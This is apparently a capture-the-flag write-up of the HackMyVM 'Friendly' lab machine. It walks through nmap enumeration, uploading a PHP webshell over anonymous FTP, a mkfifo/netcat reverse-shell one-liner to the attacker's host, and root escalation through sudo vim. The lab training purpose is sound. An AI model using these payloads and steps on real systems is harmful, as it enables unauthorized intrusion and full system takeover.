---
title: Write-up Friendly on HackMyVM
author: eMVee
date: 2024-01-17 10:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, ftp, sudo]
render_with_liquid: false
---
A while back I hacked "Friendly". An easy machine that is available on HackMyVM. This machine is good for beginners and clearly shows which possible vulnerabilities can be combined to gain access to a system.

## Getting started
First things first! We should start by creating a project directory for our target machine.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir Friendly

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd Friendly     
```

Next we should identify the IP address of our target. One of the tools to do this is fping. It generates a list with IP addresses available in your subnet.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ fping -ag 10.0.2.0/24 2> /dev/null                     
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.7
10.0.2.15
```
To make our life easier we should assign the IP address to a variable. This is useful for the commands we use.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ ip=10.0.2.7

```
## Enumeration
Time to enumerate! We should identify open ports, running services and if possible, we should identify versions. Nmap can discover a lot, so we should start a port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 22:15 CEST
Nmap scan report for 10.0.2.7
Host is up (0.00096s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:A2:9F:C0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.96 ms 10.0.2.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.31 seconds

```
The port scan has finished pretty quick. We should analyze the results and take some notes.
- Linux, probably a Debian
- Port 21
	- FTP
	- Anonymous
	- index.html file
- Port 80
	- HTTP
	- Apache 2.4.54
	- Title: Apache2 Debian Default Page: It works

The most interesting services to check first ifs the FTP service. We should check if we can upload any file to this service. If we can upload anything and access the file via the webserver we might gain control. Let's create a file with `touch`.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ touch test 
```
Next we should logon to the FTP server as anonymous and try to upload the file with `put.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ ftp $ip -a                        
Connected to 10.0.2.7.
220 ProFTPD Server (friendly) [::ffff:10.0.2.7]
331 Anonymous login ok, send your complete email address as your password
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bin
200 Type set to I
ftp> put test 
local: test remote: test
229 Entering Extended Passive Mode (|||16428|)
150 Opening BINARY mode data connection for test
     0        0.00 KiB/s 
226 Transfer complete
ftp> ls
229 Entering Extended Passive Mode (|||2142|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-rw-r--r--   1 ftp      nogroup         0 Sep  1 20:17 test
226 Transfer complete
ftp> 

```
We were able to upload the file. Now we should create a reverse shell page in PHP. We can use the `wwolf-php-webshell` PHP file. This is an awesome page were we can run commands or upload any other file.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ nano shell.php        

┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ head shell.php                                                    
#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
 * https://www.whitewinterwolf.com/tags/php-webshell/
 *
 * This file is part of wwolf-php-webshell.
 *
 * wwwolf-php-webshell is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or

```
Now we should upload the file again via the FTP service with the anonymous account.
```bash
ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||4756|)
150 Opening BINARY mode data connection for shell.php
100% |**********************************************************************************************************************************************************************************************|  7205       91.61 MiB/s    00:00 ETA
226 Transfer complete
7205 bytes sent in 00:00 (9.01 MiB/s)
ftp> exit
221 Goodbye.                
```

## Initial access
As soon as the `shell.php` file has been uploaded we should try to visit the page in the browser.

![image](/assets/img/WriteUp/HackMyVM/Friendly/Pasted image 20230901223124.png){: width="700" height="400" }

Let's run some commands `whoamilid;hostname;ip a; pwd` to see who we are, were we are working on and what the directory is we are currently working in.
![image](/assets/img/WriteUp/HackMyVM/Friendly/Pasted image 20230901223408.png){: width="700" height="400" }

We can run any command and it looks like we are `www-data`. This gives us the ability to gain a reverse shell. We should a netcat listener on our attacking machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...

```

Next we should run the following command to start a reverse shell via the browser.
```PAYLOAD
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.15 1234 >/tmp/f
```

![image](/assets/img/WriteUp/HackMyVM/Friendly/Pasted image 20230901224018.png){: width="700" height="400" }

After executing the command we should check our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Friendly]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.7] 42930
bash: cannot set terminal process group (434): Inappropriate ioctl for device
bash: no job control in this shell
www-data@friendly:/var/www/html$ 

```
We git a connection established from our victim machine. Let's see if we can discover any juicy files in the home directories.
```bash
www-data@friendly:/var/www/html$ ls /home -ahlR
ls /home -ahlR
/home:
total 12K
drwxr-xr-x  3 root    root    4.0K Feb 21  2023 .
drwxr-xr-x 18 root    root    4.0K Mar 11 04:00 ..
drwxr-xr-x  5 RiJaba1 RiJaba1 4.0K Mar 11 04:13 RiJaba1

/home/RiJaba1:
total 24K
drwxr-xr-x 5 RiJaba1 RiJaba1 4.0K Mar 11 04:13 .
drwxr-xr-x 3 root    root    4.0K Feb 21  2023 ..
lrwxrwxrwx 1 RiJaba1 RiJaba1    9 Feb 23  2023 .bash_history -> /dev/null
drwxr-xr-x 2 RiJaba1 RiJaba1 4.0K Mar 11 04:18 CTF
drwxr-xr-x 2 RiJaba1 RiJaba1 4.0K Mar 11 03:59 Private
drwxr-xr-x 2 RiJaba1 RiJaba1 4.0K Feb 21  2023 YouTube
-r--r--r-- 1 RiJaba1 RiJaba1   33 Mar 11 04:13 user.txt

/home/RiJaba1/CTF:
total 12K
drwxr-xr-x 2 RiJaba1 RiJaba1 4.0K Mar 11 04:18 .
drwxr-xr-x 5 RiJaba1 RiJaba1 4.0K Mar 11 04:13 ..
-r--r--r-- 1 RiJaba1 RiJaba1   21 Mar 11 04:18 ...

/home/RiJaba1/Private:
total 12K
drwxr-xr-x 2 RiJaba1 RiJaba1 4.0K Mar 11 03:59 .
drwxr-xr-x 5 RiJaba1 RiJaba1 4.0K Mar 11 04:13 ..
-r--r--r-- 1 RiJaba1 RiJaba1   45 Mar 11 03:59 targets.txt

/home/RiJaba1/YouTube:
total 12K
drwxr-xr-x 2 RiJaba1 RiJaba1 4.0K Feb 21  2023 .
drwxr-xr-x 5 RiJaba1 RiJaba1 4.0K Mar 11 04:13 ..
-r--r--r-- 1 RiJaba1 RiJaba1   41 Feb 21  2023 ideas.txt
www-data@friendly:/var/www/html$ 

```
There are some files readable for the whole world. One of them is the user flag, what we could open with the `cat` command.
```bash
www-data@friendly:/var/www/html$ cd /home/RiJaba1
cd /home/RiJaba1
www-data@friendly:/home/RiJaba1$ cat user.txt
cat user.txt
USER-FLAG-HAS-BEEN-CAPTURED

```


## Privilege escalation
We got the user flag, so we should continue and gain more privileges...
```bash
www-data@friendly:/home/RiJaba1/YouTube$ cd ~
cd ~
www-data@friendly:/var/www$ ls
ls
html
www-data@friendly:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
www-data@friendly:/var/www$ 

```
We can use vim with sudo permissions. This is a known privilege escalation path and it is fully explained on [GTFObins](https://gtfobins.github.io/gtfobins/vim/#sudo). So let's follow the steps explained on the website. And capture the root flag.
```bash
www-data@friendly:/var/www/html$ sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/vim -c ':!/bin/sh'
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'


















































:!/bin/sh
whoami
root
hostname
friendly
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:a2:9f:c0 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.7/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 548sec preferred_lft 548sec
    inet6 fe80::a00:27ff:fea2:9fc0/64 scope link 
       valid_lft forever preferred_lft forever
ls /root
interfaces.sh
root.txt
cat root.txt
cat: root.txt: No such file or directory
cat /root/root.txt
Not yet! Find root.txt.

```
Well, the root flag was not in the root directory. Let's find it. 
```bash
find / -name root.txt 2>/dev/null
/var/log/apache2/root.txt
/root/root.txt


```
We have found the root flag in the log directory of Apache. Let's capture the flag!
```bash
cat /var/log/apache2/root.txt
ROOT-FLAG-HAS-BEEN-CAPTURED

```
